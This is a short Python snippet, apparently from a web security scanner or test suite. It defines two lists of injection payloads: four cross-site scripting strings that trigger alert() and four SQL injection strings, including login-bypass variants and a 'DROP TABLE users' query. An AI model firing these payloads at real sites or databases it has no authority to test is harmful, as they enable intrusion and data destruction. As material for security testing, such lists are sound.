
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'><img src=x onerror=alert('XSS')>",
    "\" onmouseover=alert('XSS')",
    "<svg/onload=alert('XSS')>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "'; DROP TABLE users; --"
]
